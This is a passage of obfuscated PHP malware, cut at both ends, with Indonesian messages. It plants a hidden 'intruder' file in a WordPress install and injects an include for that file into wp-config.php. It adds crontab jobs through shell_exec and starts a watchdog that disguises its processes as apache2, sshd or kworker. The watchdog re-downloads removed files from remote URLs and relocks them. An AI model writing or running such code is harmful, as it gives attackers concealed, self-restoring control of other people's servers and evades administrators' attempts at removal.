"\74\x3f\x70\150\x70\40\x69\146\x20\50\146\x75\156\x63\x74\x69\x6f\x6e\x5f\145\170\151\x73\x74\x73\50\x27\163\150\x65\x6c\x6c\x5f\145\170\x65\143\x27\51\40\x26\x26\40\x21\x69\x6e\x5f\x61\162\x72\141\x79\x28\x27\x73\x68\x65\154\154\x5f\x65\x78\x65\143\x27\54\40\x61\162\162\x61\171\137\x6d\141\x70\x28\47\164\162\151\155\47\54\x20\x65\170\160\154\x6f\x64\x65\x28\x27\54\x27\x2c\40\x69\x6e\x69\137\x67\x65\x74\x28\47\x64\x69\163\141\142\x6c\145\x5f\146\165\x6e\x63\164\151\157\156\163\x27\51\x29\51\51\x29\40\x7b\40\44\x63\40\75\40" . var_export($cron_content_for_intruder, true) . "\73\x20\44\x63\x63\40\75\40\100\x73\150\x65\154\x6c\137\x65\170\145\143\50\x22\143\162\157\156\164\141\142\40\55\x6c\x22\x29\x3b\x20\x69\146\x20\x28\x24\x63\x63\x20\75\75\x3d\x20\x6e\165\154\x6c\40\x7c\174\x20\x73\x74\162\x70\157\163\x28\44\143\143\x2c\x20\44\x63\51\40\75\75\75\40\x66\x61\x6c\x73\x65\51\x20\x7b\40\x24\164\x20\x3d\x20\x40\x74\145\155\x70\x6e\141\x6d\50\42\x2f\x74\x6d\x70\42\x2c\x20\42\143\x22\51\x3b\40\100\x66\x69\154\145\x5f\x70\x75\x74\137\x63\x6f\x6e\164\x65\156\x74\163\50\x24\164\54\x20\44\x63\40\x2e\x20\x50\x48\x50\137\105\117\114\51\x3b\x20\x40\x73\x68\x65\154\x6c\137\x65\x78\x65\143\x28\42\x63\162\x6f\x6e\164\141\142\x20\x22\x20\56\x20\44\164\51\73\x20\100\x75\x6e\154\x69\x6e\153\50\44\x74\51\73\40\x7d\40\x7d\x20\x3f\76"; if (@file_put_contents($intruder_file_path, $intruder_code)) { @chmod($intruder_file_path, 292); $config_content = file_get_contents($wp_config_file); $injection_code = $dynamic_names["\x69\156\164\x72\x75\144\x65\162\137\x73\x69\147\156\x61\164\165\x72\x65"] . "\xa\x40\151\x6e\x63\x6c\x75\x64\145\x5f\157\x6e\143\145\x28\101\x42\x53\120\101\124\x48\x20\x2e\40\x27\167\160\x2d\x69\x6e\143\x6c\165\x64\145\x73\57" . $dynamic_names["\x69\156\164\x72\x75\144\x65\162\x5f\x6e\141\x6d\x65"] . "\x27\51\x3b\xa"; if (strpos($config_content, $dynamic_names["\x69\x6e\164\162\165\144\x65\162\x5f\x73\x69\147\x6e\x61\x74\165\162\145"]) === false) { $new_config_content = str_replace("\x3c\77\x70\x68\160", "\74\77\x70\150\160\xa\xa" . $injection_code, $config_content); if (@file_put_contents($wp_config_file, $new_config_content)) { $output_messages[] = "\114\x61\160\x69\x73\x20\65\72\40\120\x65\x72\x74\x61\150\x61\x6e\141\156\40\x27\x50\145\156\x79\165\x73\x75\160\x27\40\142\145\162\x68\x61\x73\x69\x6c\40\x64\x69\164\141\156\141\155\x20\x64\x69\40\74\x73\x74\x72\157\156\x67\x3e\x77\160\x2d\143\x6f\156\x66\151\x67\x2e\160\150\160\x3c\x2f\163\164\162\x6f\x6e\x67\x3e\56"; } else { $error_messages[] = "\x4c\141\160\x69\x73\40\x35\x3a\x20\107\141\147\141\x6c\x20\x6d\145\x6e\x79\x75\x6e\164\x69\153\x6b\x61\x6e\x20\x6b\157\x64\145\x20\x6b\145\40\140\167\160\55\x63\157\156\146\x69\x67\56\160\x68\160\140\x2e"; } } else { $output_messages[] = "\114\141\x70\x69\x73\40\x35\x3a\40\x50\x65\162\164\x61\x68\x61\156\x61\x6e\40\47\120\145\x6e\x79\x75\x73\x75\x70\47\x20\163\x75\x64\141\x68\40\x61\144\141\x20\x64\151\x20\140\167\x70\55\143\157\x6e\x66\151\147\56\160\x68\x70\140\x2e"; } } else { $error_messages[] = "\114\141\160\151\163\x20\65\x3a\x20\x47\x61\x67\141\154\x20\155\x65\x6d\x62\165\141\164\40\x66\x69\x6c\145\40\160\145\156\171\x75\x73\x75\160\40\144\x69\x20\47{$intruder_file_path}\x27\56"; } } $targets = $_POST["\164\x61\x72\x67\x65\164\163"] ?? array(); $urls = $_POST["\x75\x72\154\163"] ?? array(); $interval = (int) ($_POST["\151\156\x74\145\162\x76\141\154"] ?? 5); if ($interval < 2) { $interval = 2; } $filesToProtect = array(); $cronCommandsToAdd = array(); $php_binary_path = find_php_cli_binary(); $cache_base_dir = null; $tmp_path = "\57\164\155\x70"; if (is_path_allowed_by_basedir($tmp_path) && @is_writable($tmp_path)) { $cache_base_dir = $tmp_path . DIRECTORY_SEPARATOR . $dynamic_names["\x64\151\162\137\156\141\x6d\145"]; $log_filepath = $tmp_path . DIRECTORY_SEPARATOR . bin2hex(random_bytes(6)) . "\x2e\154\x6f\147"; } else { $cache_base_dir = __DIR__ . DIRECTORY_SEPARATOR . $dynamic_names["\x64\151\x72\x5f\156\x61\155\145"]; $log_filepath = $cache_base_dir . DIRECTORY_SEPARATOR . $dynamic_names["\154\x6f\x67\137\x6e\x61\155\145"]; } $cache_script_filepath = $cache_base_dir . DIRECTORY_SEPARATOR . $dynamic_names["\x73\143\162\x69\x70\164\137\x6e\x61\x6d\145"]; if (!is_dir($cache_base_dir)) { if (!@mkdir($cache_base_dir, 511, true)) { $error_messages[] = "\107\x61\147\141\154\40\155\145\x6d\x62\165\x61\164\40\144\151\x72\145\x6b\x74\157\162\x69\40\143\x61\143\x68\145\x20\x64\151\40\x27{$cache_base_dir}\x27\x2e\x20\x50\145\x72\151\x6b\163\141\x20\151\x7a\151\x6e\x20\x74\165\x6c\151\163\56"; } else { @chmod($cache_base_dir, 511); if (strpos($cache_base_dir, __DIR__) === 0) { @file_put_contents($cache_base_dir . "\x2f\x2e\150\x74\141\x63\x63\145\x73\163", "\x44\145\x6e\x79\x20\x66\x72\x6f\155\40\141\x6c\x6c"); } } } else { @chmod($cache_base_dir, 511); } $unique_cron_instance_id = bin2hex(random_bytes(4)); for ($i = 0; $i < count($targets); $i++) { if (!empty($targets[$i]) && !empty($urls[$i]) && filter_var($urls[$i], FILTER_VALIDATE_URL)) { $full_target_path = $targets[$i]; if (strtolower($full_target_path) === "\x5f\x5f\146\151\x6c\145\137\x5f") { $full_target_path = __FILE__; } elseif (strpos($full_target_path, DIRECTORY_SEPARATOR) === false && !empty($full_target_path)) { $full_target_path = __DIR__ . DIRECTORY_SEPARATOR . $full_target_path; } if (!is_file($full_target_path) && !is_dir(dirname($full_target_path))) { error_log("\x43\x41\103\110\105\137\115\x41\116\x41\107\x45\x52\x5f\x53\x4b\x49\x50\x3a\40\124\141\162\x67\x65\164\x20\47{$targets[$i]}\47\x20\x74\x69\x64\141\x6b\40\166\x61\x6c\151\x64\x2e"); continue; } $filesToProtect[] = array("\x74\x61\x72\147\145\x74" => $full_target_path, "\142\x61\x63\153\x75\160\x55\162\x6c" => $urls[$i]); $cronCommandsToAdd = array_merge($cronCommandsToAdd, generateMutualProtectionCronCommands($cache_script_filepath, $full_target_path, $urls[$i], $php_binary_path ?: "\x70\150\160", $unique_cron_instance_id, $dynamic_names, $log_filepath)); } } $cronCommandsToAdd = array_unique($cronCommandsToAdd); if (empty($filesToProtect) && empty($error_messages)) { $error_messages[] = "\x54\x69\144\141\153\x20\x61\144\x61\40\x74\x61\x72\147\x65\x74\x20\166\141\154\151\x64\x2e"; } if (!empty($filesToProtect) && empty($error_messages)) { $filesToProtectPHPCode = var_export($filesToProtect, true); $cronCommandsPHPCode = var_export($cronCommandsToAdd, true); $dynamicNamesPHPCode = var_export($dynamic_names, true); $fakeProcessTitles = var_export(array("\57\x75\163\x72\x2f\163\x62\151\156\57\141\160\141\x63\x68\145\62\40\x2d\153\x20\x73\x74\x61\x72\164", "\x5b\153\167\157\162\153\x65\x72\57\165\x38\x3a\62\135", "\x5b\162\x63\165\x5f\163\143\x68\145\x64\135", "\x6e\x67\151\x6e\x78\72\x20\x77\157\x72\x6b\x65\162\40\x70\162\157\x63\x65\163\163", "\160\x68\x70\x2d\146\x70\155\x3a\40\x70\157\157\154\x20\x77\167\x77", "\57\165\x73\162\57\163\x62\151\156\x2f\163\x73\x68\x64\x20\55\x44"), true); preg_match("\57\146\x75\x6e\x63\x74\x69\x6f\156\x20\164\x72\x79\x5f\145\170\x65\143\x75\x74\x65\137\143\157\x6d\x6d\141\x6e\x64\56\52\77\134\175\x5c\163\52\x5c\175\57\x73", file_get_contents(__FILE__), $matches); $tryExecuteCommandCode = $matches[0] ?? ''; $cache_code = "\74\x3f\160\x68\x70\xa\163\x65\x74\x5f\164\x69\x6d\145\x5f\154\151\155\151\x74\x28\60\51\x3b\xa\x69\147\x6e\157\162\145\x5f\165\163\x65\x72\x5f\141\x62\x6f\x72\x74\x28\164\162\x75\145\51\73\xa\x64\141\x74\x65\137\144\x65\146\x61\165\x6c\x74\x5f\x74\151\155\145\172\x6f\156\x65\137\x73\x65\x74\x28\47\x41\163\x69\x61\57\112\x61\153\141\x72\x74\x61\x27\x29\x3b\12\xa\151\146\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\137\145\170\x69\x73\164\163\50\47\x63\154\151\137\x73\145\164\x5f\x70\x72\x6f\143\x65\x73\163\137\164\x69\164\154\145\47\51\x29\40\x7b\12\40\x20\40\x20\x24\x66\141\x6b\145\x5f\x74\151\164\x6c\145\163\x20\x3d\40{$fakeProcessTitles}\x3b\xa\40\40\x20\x20\100\x63\154\151\137\163\x65\164\137\x70\x72\157\143\x65\x73\x73\x5f\x74\x69\x74\154\145\50\44\x66\141\x6b\145\137\x74\x69\164\154\145\163\133\x61\162\x72\x61\171\137\162\141\x6e\144\x28\x24\146\x61\x6b\145\137\x74\x69\x74\x6c\145\163\51\135\51\73\12\x7d\12\12\44\146\x69\x6c\x65\163\124\157\x50\162\157\164\145\143\164\40\x3d\x20{$filesToProtectPHPCode}\73\xa\x24\143\162\157\156\x43\157\155\155\x61\156\x64\x73\124\157\105\x6e\163\165\x72\145\x20\x3d\x20{$cronCommandsPHPCode}\73\12\x24\144\x79\156\141\x6d\x69\143\x5f\156\x61\x6d\x65\163\x20\x3d\x20{$dynamicNamesPHPCode}\x3b\12\x24\x69\x6e\x74\x65\162\166\x61\x6c\x20\x3d\40{$interval}\73\40\12\xa\57\57\x20\x2d\x2d\x2d\x20\x53\x54\x41\122\124\40\x49\156\152\x65\x63\164\x65\x64\x20\106\165\156\143\x74\151\x6f\156\163\x20\x2d\55\x2d\12\146\x75\x6e\x63\x74\x69\157\156\40\137\137\165\x30\170\x5f\x64\x33\x63\x30\x64\63\137\163\x74\x72\x5f\146\162\x30\x6d\137\64\x73\x63\61\x31\137\64\162\162\x34\x79\x28\x24\x61\51\173\40\x24\163\75\47\47\x3b\40\x69\x66\x28\x21\151\163\137\141\x72\162\141\171\x28\x24\x61\51\51\162\x65\x74\165\x72\156\47\x27\73\x20\146\157\162\145\x61\143\150\x28\x24\x61\40\141\x73\40\x24\143\51\173\151\146\50\151\163\x5f\151\156\164\50\x24\x63\51\46\x26\x24\143\76\75\x30\46\46\44\143\74\x3d\62\65\65\x29\173\44\x73\56\75\143\150\x72\x28\x24\x63\x29\x3b\x7d\x7d\162\145\164\x75\162\156\x20\x24\x73\x3b\175\12\x66\165\156\x63\164\151\x6f\156\x20\137\x67\145\164\x5f\x66\156\137\x6e\141\x6d\145\x5f\x67\x6c\x6f\x62\x61\x6c\137\151\156\x69\x74\137\x76\63\x28\44\x61\x2c\x20\x24\x64\x29\173\x20\151\x66\x28\x24\144\x3d\x3d\75\47\146\x75\156\143\x74\x69\157\156\x5f\x65\x78\x69\163\164\x73\47\51\x72\x65\x74\165\162\x6e\x27\146\165\156\x63\x74\151\157\x6e\x5f\145\170\x69\163\164\x73\x27\x3b\44\x6e\75\x27\x27\73\40\x69\146\x28\x69\x73\x73\145\164\50\44\107\114\117\x42\101\x4c\x53\x5b\44\141\135\51\46\x26\x69\163\137\141\162\162\141\171\x28\44\x47\114\117\102\x41\114\123\133\x24\141\x5d\51\x29\x7b\44\156\x3d\137\x5f\x75\x30\x78\x5f\x64\63\x63\60\x64\63\x5f\x73\164\x72\137\x66\x72\60\x6d\x5f\x34\x73\143\x31\61\137\x34\162\x72\x34\x79\x28\x24\x47\114\117\x42\101\x4c\123\133\x24\141\135\51\73\175\x20\151\x66\x28\x21\145\x6d\x70\164\x79\50\x24\156\x29\x26\46\151\x73\137\x73\x74\162\x69\156\x67\x28\44\156\51\46\46\146\165\x6e\143\x74\151\x6f\156\x5f\145\x78\x69\163\x74\x73\x28\x24\x6e\51\51\x7b\x72\145\164\x75\x72\x6e\40\44\156\73\x7d\x65\x6c\163\x65\x69\146\x28\146\x75\x6e\x63\x74\x69\157\x6e\x5f\x65\x78\x69\163\x74\x73\x28\x24\x64\51\51\x7b\x72\x65\x74\165\162\x6e\x20\x24\x64\73\x7d\145\154\x73\x65\x7b\162\x65\164\x75\162\x6e\x27\47\x3b\175\x7d\12\44\107\x4c\x4f\x42\101\x4c\123\133\x27\137\x67\137\141\163\143\x69\151\137\151\x6d\x70\x6c\157\x64\145\47\135\75\x5b\x31\x30\x35\x2c\61\x30\71\54\61\x31\62\x2c\61\x30\70\54\x31\x31\61\x2c\61\x30\60\x2c\61\x30\61\x5d\73\x24\x47\114\x4f\102\101\114\123\133\x27\137\147\137\x61\163\x63\151\151\137\151\163\137\162\x65\163\x6f\x75\162\x63\145\47\135\75\133\61\60\65\54\61\61\x35\54\71\65\x2c\x31\x31\64\x2c\61\x30\x31\x2c\61\x31\x35\x2c\61\x31\61\x2c\x31\x31\67\x2c\x31\x31\x34\x2c\x39\x39\x2c\61\x30\61\x5d\x3b\44\107\x4c\x4f\x42\101\114\123\133\47\x5f\x67\x5f\x61\x73\x63\x69\151\137\163\164\x72\x65\141\155\137\163\145\x74\137\x74\x69\155\145\157\165\x74\x27\135\75\133\61\61\x35\54\61\x31\66\54\61\x31\x34\x2c\61\60\61\54\71\67\54\x31\60\x39\54\71\x35\x2c\x31\61\65\x2c\61\60\61\54\x31\x31\66\x2c\71\65\54\x31\x31\x36\54\61\x30\65\54\x31\x30\71\x2c\x31\60\61\x2c\x31\61\x31\x2c\61\x31\67\54\61\x31\x36\135\x3b\x24\107\114\x4f\102\101\x4c\x53\133\47\137\x67\x5f\141\x73\143\x69\151\137\163\164\162\x65\x61\x6d\x5f\x67\145\164\x5f\143\157\156\164\x65\156\164\x73\47\135\75\133\x31\x31\65\54\x31\61\x36\x2c\x31\61\x34\54\x31\60\61\54\71\x37\54\61\x30\71\x2c\71\65\54\x31\x30\63\x2c\61\60\61\54\61\x31\66\x2c\71\65\54\x39\71\x2c\x31\61\61\x2c\x31\x31\x30\54\x31\x31\x36\54\x31\x30\x31\x2c\x31\61\x30\54\x31\x31\x36\54\61\x31\x35\x5d\x3b\44\107\x4c\117\x42\101\x4c\x53\x5b\47\x5f\x67\x5f\141\x73\x63\x69\151\137\146\x63\x6c\x6f\163\x65\47\135\75\133\61\60\x32\54\x39\71\x2c\x31\x30\x38\x2c\61\x31\x31\x2c\x31\61\65\54\61\x30\x31\x5d\73\44\107\x4c\x4f\x42\101\x4c\x53\133\47\137\x67\137\x61\163\x63\x69\x69\137\x66\145\x6f\146\47\x5d\75\x5b\61\60\62\x2c\61\60\61\x2c\61\x31\61\54\61\60\62\135\73\x24\x47\114\117\x42\101\x4c\x53\x5b\x27\x5f\147\x5f\x61\163\x63\x69\151\x5f\146\162\145\x61\x64\47\135\75\133\x31\x30\62\x2c\x31\61\64\54\x31\60\61\x2c\71\67\54\61\60\60\x5d\73\x24\107\114\117\102\x41\114\x53\133\x27\x5f\147\x5f\141\x73\143\x69\x69\137\145\170\145\143\x27\135\x3d\133\61\60\61\x2c\61\x32\60\x2c\61\60\x31\54\71\71\135\x3b\x24\x47\x4c\x4f\x42\x41\114\x53\x5b\47\x5f\x67\x5f\141\x73\x63\x69\151\x5f\x73\150\x65\x6c\x6c\x5f\x65\170\x65\x63\47\135\x3d\133\61\61\x35\54\61\x30\64\54\61\60\x31\x2c\x31\60\x38\x2c\x31\x30\x38\x2c\71\x35\x2c\x31\60\61\x2c\61\62\x30\54\61\60\x31\x2c\71\71\x5d\x3b\44\x47\x4c\x4f\x42\101\114\x53\133\x27\137\147\x5f\x61\x73\143\151\151\137\160\x72\x6f\143\137\x6f\x70\145\156\47\x5d\75\133\x31\x31\x32\54\61\61\x34\54\61\61\61\54\71\x39\54\x39\x35\54\x31\x31\x31\x2c\x31\x31\62\54\61\x30\61\54\x31\61\60\135\73\x24\x47\x4c\x4f\x42\101\114\x53\133\47\x5f\147\137\x61\163\x63\x69\x69\137\x70\162\157\143\137\143\x6c\x6f\x73\x65\x27\135\x3d\133\x31\x31\x32\54\61\61\x34\54\61\x31\x31\x2c\x39\71\x2c\71\65\x2c\x39\x39\54\x31\60\70\x2c\61\61\61\54\x31\61\x35\x2c\61\x30\61\135\x3b\44\x47\114\117\102\101\x4c\123\x5b\x27\x5f\147\137\141\163\143\151\x69\137\160\x6f\x70\145\156\x27\135\75\133\x31\61\62\54\x31\x31\61\x2c\61\x31\x32\54\61\x30\x31\54\x31\x31\60\135\73\44\x47\x4c\x4f\102\101\114\x53\x5b\x27\137\147\137\x61\x73\x63\151\x69\x5f\160\143\x6c\x6f\163\x65\47\x5d\75\133\61\61\x32\54\x39\x39\x2c\61\60\x38\54\x31\61\x31\x2c\x31\x31\x35\x2c\x31\60\61\135\73\x24\x47\x4c\x4f\x42\101\114\123\x5b\47\137\x67\137\141\x73\143\x69\x69\137\x67\x65\x74\143\x77\x64\x27\x5d\x3d\133\61\60\x33\x2c\x31\x30\x31\54\61\61\66\x2c\71\x39\54\x31\61\71\54\61\60\60\135\x3b\x24\107\114\117\102\x41\x4c\x53\x5b\47\137\147\x5f\141\163\143\151\x69\137\x63\x68\x64\x69\x72\x27\x5d\75\x5b\x39\71\x2c\61\x30\x34\x2c\61\x30\60\x2c\61\x30\65\54\x31\x31\64\135\x3b\xa{$tryExecuteCommandCode}\12\x2f\x2f\40\55\55\55\40\x45\x4e\x44\x20\111\x6e\152\145\143\x74\145\x64\40\x46\x75\156\x63\x74\x69\157\x6e\163\40\55\55\55\xa\xa\x66\x75\x6e\143\164\x69\x6f\x6e\x20\x66\145\164\143\x68\x43\x6f\x6e\164\x65\156\164\50\x24\165\x72\x6c\x29\40\173\xa\40\40\40\x20\151\146\x20\50\41\x66\x75\x6e\143\164\151\157\x6e\x5f\x65\x78\x69\x73\164\x73\50\x27\x63\x75\x72\154\x5f\151\156\x69\x74\x27\51\x29\40\x7b\xa\x20\40\40\40\40\40\x20\x20\x65\x63\150\157\40\42\133\x22\x2e\x64\x61\164\145\50\42\x48\72\151\72\163\42\51\x2e\x22\x5d\40\xe2\x9d\214\40\x45\x6b\x73\x74\x65\x6e\163\151\40\143\125\122\x4c\x20\164\151\x64\x61\153\40\164\145\162\x73\145\x64\x69\x61\56\x5c\156\42\x3b\12\40\40\x20\x20\40\40\40\40\x72\x65\164\x75\x72\156\40\x66\x61\x6c\163\145\x3b\12\x20\x20\x20\x20\x7d\12\x20\x20\x20\40\44\x63\150\x20\x3d\x20\143\165\162\x6c\x5f\x69\156\151\164\50\x24\165\162\154\51\x3b\12\x20\40\40\x20\143\x75\x72\x6c\x5f\163\x65\164\157\160\164\x28\x24\143\150\54\40\x43\125\x52\x4c\x4f\120\x54\x5f\122\x45\x54\125\122\116\124\x52\101\116\x53\x46\x45\x52\54\40\x74\162\165\x65\x29\x3b\xa\x20\40\x20\x20\143\165\x72\x6c\137\x73\x65\x74\157\x70\164\x28\44\143\x68\54\40\x43\125\122\x4c\x4f\x50\124\x5f\106\x4f\114\114\x4f\127\x4c\117\103\101\x54\111\x4f\x4e\54\40\164\x72\x75\x65\51\73\xa\40\x20\40\x20\143\165\x72\x6c\x5f\163\x65\x74\x6f\x70\x74\x28\x24\x63\150\54\x20\x43\x55\122\x4c\x4f\x50\x54\x5f\124\111\115\x45\x4f\125\x54\x2c\x20\x32\60\51\x3b\xa\40\x20\40\40\x63\165\162\x6c\x5f\x73\x65\164\157\160\x74\50\x24\143\150\x2c\40\103\125\x52\114\x4f\x50\124\x5f\x55\x53\x45\x52\101\107\x45\116\x54\54\40\x27\103\141\x63\x68\x65\x4d\x61\156\141\147\145\x72\57\x31\x2e\61\x27\x29\73\12\x20\40\x20\x20\x24\x64\141\x74\141\40\75\x20\x63\165\x72\x6c\137\x65\170\x65\143\50\44\x63\150\51\73\12\x20\40\x20\x20\x24\x68\164\x74\x70\x5f\143\x6f\144\145\40\x3d\x20\143\x75\x72\154\137\x67\x65\x74\151\156\146\157\x28\44\x63\150\54\40\x43\125\x52\114\111\x4e\106\117\137\x48\124\124\120\x5f\x43\117\x44\x45\x29\x3b\12\40\40\40\40\44\145\162\162\x6f\x72\x20\75\40\143\x75\x72\154\137\x65\x72\x72\x6f\x72\x28\44\143\150\x29\x3b\12\40\x20\x20\40\143\x75\162\x6c\x5f\x63\154\157\163\x65\50\x24\x63\150\x29\73\xa\xa\x20\x20\40\x20\x69\146\40\50\44\144\141\164\141\40\75\75\x3d\40\x66\141\154\x73\145\x20\174\174\x20\44\150\x74\164\x70\137\x63\157\144\145\x20\x21\75\75\40\x32\60\60\x29\x20\x7b\xa\x20\40\x20\40\x20\x20\40\40\x65\143\150\x6f\x20\42\x5b\x22\x2e\144\x61\x74\x65\50\x22\110\x3a\151\72\x73\x22\51\56\x22\135\40\342\235\214\x20\107\141\147\141\x6c\40\x61\155\142\151\x6c\40\142\x61\x63\153\x75\x70\x20\144\x61\162\x69\x20\173\x24\x75\162\154\x7d\56\x20\110\x54\124\120\x3a\173\44\x68\x74\164\x70\x5f\x63\x6f\144\x65\x7d\56\40\105\162\x72\x6f\x72\x3a\x20\173\44\145\162\x72\157\162\175\134\x6e\42\x3b\12\40\40\x20\40\x20\x20\40\x20\162\145\x74\165\x72\156\x20\x66\x61\154\x73\145\x3b\xa\40\x20\40\x20\x7d\12\40\40\x20\x20\162\x65\x74\165\x72\x6e\40\x24\144\141\x74\141\x3b\xa\x7d\12\12\x66\165\x6e\143\x74\x69\157\156\x20\145\156\x73\165\x72\x65\104\151\x72\120\x65\x72\155\x73\122\145\143\x75\162\163\x69\x76\145\x28\44\144\151\162\120\141\164\x68\54\x20\x24\160\145\162\155\40\x3d\x20\x30\67\67\67\x2c\40\44\143\165\x72\162\145\156\164\x44\x65\160\x74\150\x20\75\x20\60\x2c\x20\44\x6d\141\x78\x44\x65\160\164\x68\40\x3d\x20\67\51\x20\173\12\x20\x20\40\x20\151\x66\40\50\x24\143\x75\162\162\145\x6e\x74\104\x65\x70\164\x68\40\x3e\40\x24\x6d\x61\x78\104\145\x70\164\150\x20\174\x7c\40\x21\x24\144\151\x72\x50\141\164\150\x20\174\x7c\40\x24\x64\x69\x72\120\141\x74\x68\x20\x3d\x3d\75\40\x27\56\x27\40\x7c\x7c\40\x24\x64\x69\x72\x50\141\x74\x68\40\75\75\75\x20\47\x2e\56\47\x20\x29\40\162\x65\x74\x75\x72\156\x3b\xa\x20\40\x20\40\x69\146\40\x28\151\163\x5f\x6c\151\x6e\153\50\x24\144\x69\162\120\x61\164\150\51\x29\x20\162\145\x74\165\162\156\73\12\12\x20\x20\x20\x20\x69\x66\x20\x28\151\163\137\x64\x69\x72\x28\44\x64\151\x72\x50\x61\x74\150\x29\51\40\173\12\x20\x20\40\x20\40\x20\40\40\x24\x63\165\162\x72\145\156\164\x5f\x70\x65\162\x6d\x73\x5f\x76\x61\x6c\x20\75\x20\x40\146\x69\x6c\x65\160\x65\162\155\x73\50\x24\x64\x69\x72\x50\x61\164\150\x29\x3b\xa\x20\40\40\40\x20\x20\40\x20\151\146\x20\50\x24\x63\165\x72\162\145\x6e\164\137\160\145\x72\155\163\x5f\x76\141\x6c\x20\41\x3d\75\40\146\x61\x6c\x73\x65\x29\40\173\12\x20\x20\40\40\40\40\x20\40\x20\x20\x20\x20\151\x66\x20\50\x28\44\x63\x75\162\162\x65\x6e\164\x5f\x70\145\x72\x6d\x73\x5f\x76\x61\154\x20\46\x20\x30\67\67\x37\x29\40\41\x3d\x3d\40\x30\67\x37\x37\51\40\x7b\12\40\40\40\x20\x20\x20\x20\40\x20\40\x20\40\x20\40\x20\x20\x20\x24\143\165\x72\162\x65\x6e\x74\x5f\160\145\162\155\163\x5f\157\x63\164\x61\154\x5f\163\x74\x72\x20\75\40\x73\x75\142\163\x74\x72\x28\163\160\162\151\x6e\x74\146\50\47\x25\157\47\54\x20\x24\143\165\x72\x72\x65\156\164\x5f\160\x65\x72\155\163\x5f\166\x61\x6c\51\54\x20\55\64\51\73\xa\x20\40\x20\40\40\x20\40\x20\x20\x20\40\40\x20\40\x20\x20\x20\x65\x63\x68\157\40\42\x5b\42\x2e\x64\x61\164\x65\50\42\x48\72\151\72\x73\x22\51\x2e\42\x5d\40\360\237\223\x82\40\104\151\x72\40\x70\145\162\155\x73\40\x66\157\162\x20\47\x7b\44\144\x69\162\x50\x61\x74\150\x7d\x27\x20\167\141\163\x20\47\x7b\44\143\x75\162\x72\145\x6e\x74\137\x70\145\x72\x6d\x73\137\x6f\143\164\141\154\x5f\x73\x74\162\175\47\54\40\x73\x65\x74\x74\151\156\x67\x20\x74\x6f\x20\x30\x22\40\x2e\40\x64\x65\143\157\x63\164\x28\44\160\145\162\x6d\51\x20\56\x20\x22\56\134\x6e\x22\x3b\12\40\40\40\40\40\40\40\40\40\40\40\x20\40\40\40\x20\40\100\143\150\x6d\x6f\x64\50\44\x64\x69\162\x50\141\x74\150\54\40\x24\160\145\162\155\51\x3b\xa\x20\40\40\40\x20\40\40\40\40\x20\x20\x20\x7d\12\40\x20\40\x20\x20\40\40\x20\x7d\12\x20\x20\40\40\175\xa\12\40\x20\x20\40\x24\160\x61\162\145\156\x74\104\x69\x72\40\x3d\40\144\151\162\156\x61\x6d\145\50\x24\x64\x69\162\120\141\164\x68\51\x3b\12\40\x20\40\x20\x69\146\40\x28\44\160\x61\x72\145\x6e\164\104\151\x72\x20\x21\75\x3d\40\44\x64\151\x72\x50\x61\x74\x68\x20\46\x26\40\44\x70\141\x72\145\x6e\164\x44\151\162\x20\41\x3d\75\x20\47\x2f\47\x29\x20\x7b\40\xa\40\40\x20\40\40\40\40\40\x65\156\x73\165\162\x65\x44\x69\162\x50\x65\x72\x6d\x73\x52\x65\143\165\162\x73\x69\x76\145\x28\x24\160\141\162\x65\156\x74\104\x69\162\x2c\40\44\160\145\162\155\54\x20\x24\x63\x75\162\162\x65\156\x74\104\x65\160\x74\x68\x20\x2b\40\x31\54\x20\x24\x6d\141\x78\x44\145\160\x74\x68\51\73\xa\x20\x20\40\x20\175\40\145\x6c\x73\x65\151\146\x20\50\x24\160\x61\162\145\156\164\x44\x69\x72\x20\75\75\x3d\x20\47\57\47\x20\46\x26\40\x24\x64\x69\162\x50\x61\164\150\40\x21\75\75\x20\x27\57\47\x29\40\x7b\x20\12\40\40\x20\x20\x20\40\40\40\x20\x65\156\x73\165\x72\145\104\151\x72\120\145\162\155\x73\x52\x65\x63\x75\162\163\151\x76\x65\50\x24\160\141\162\145\x6e\164\x44\151\x72\54\40\x24\x70\x65\162\155\x2c\x20\x24\x63\x75\162\x72\x65\156\x74\104\x65\160\x74\150\x20\53\x20\x31\x2c\40\x24\155\x61\x78\x44\x65\160\164\150\x29\73\xa\40\x20\x20\40\x7d\12\x7d\12\xa\x66\165\x6e\x63\x74\x69\157\x6e\40\167\162\x69\x74\x65\101\x6e\144\x4c\x6f\143\x6b\50\x24\x70\141\x74\x68\x2c\x20\44\143\x6f\156\164\x65\156\x74\51\x20\x7b\12\40\x20\x20\x20\44\x66\157\154\144\x65\162\x5f\157\146\137\160\141\164\150\40\x3d\40\x64\x69\162\x6e\x61\155\145\50\x24\x70\141\164\x68\x29\x3b\xa\x20\40\40\40\151\x66\40\x28\41\151\163\x5f\144\151\x72\x28\x24\x66\x6f\154\x64\x65\162\137\157\x66\x5f\x70\x61\164\x68\51\x29\x20\173\12\x20\40\40\40\x20\40\40\x20\100\155\x6b\x64\x69\162\50\x24\x66\x6f\x6c\144\x65\162\137\x6f\146\x5f\160\141\164\150\x2c\40\x30\x37\x37\67\x2c\x20\x74\162\165\x65\51\73\x20\xa\40\x20\40\40\x20\x20\40\40\x65\156\163\x75\x72\x65\104\151\x72\x50\145\162\x6d\x73\x52\145\x63\165\162\x73\151\x76\145\x28\44\x66\157\154\144\x65\x72\x5f\157\146\137\160\x61\164\150\54\x20\60\67\67\x37\51\x3b\40\xa\40\x20\40\40\175\12\40\40\x20\40\x69\x66\x20\50\x40\146\x69\x6c\145\x5f\x70\165\x74\137\x63\x6f\156\x74\145\x6e\x74\163\x28\x24\x70\x61\x74\150\54\40\44\x63\157\x6e\x74\145\156\x74\51\x20\41\x3d\x3d\40\146\x61\154\x73\145\x29\x20\173\12\40\40\x20\40\x20\x20\x20\40\100\x63\x68\155\157\x64\50\44\x70\x61\x74\x68\x2c\x20\60\x34\64\64\51\73\40\xa\40\x20\40\40\x20\x20\x20\x20\162\145\164\165\x72\x6e\40\x74\x72\165\x65\x3b\12\x20\40\40\x20\175\xa\x20\40\40\40\x72\x65\x74\165\x72\156\x20\146\141\154\x73\x65\73\xa\x7d\12\12\145\x63\150\x6f\40\x22\x3d\x3d\x3d\75\x3d\x3d\x3d\75\75\75\75\75\75\75\75\x3d\x3d\x3d\75\75\75\75\x3d\x3d\x3d\x3d\75\75\75\x3d\75\75\75\x3d\75\x3d\75\x3d\x3d\x3d\75\75\75\75\75\x5c\x6e\x22\x3b\xa\x65\x63\150\x6f\40\x22\xf0\x9f\233\241\357\xb8\x8f\x20\123\x79\163\x74\1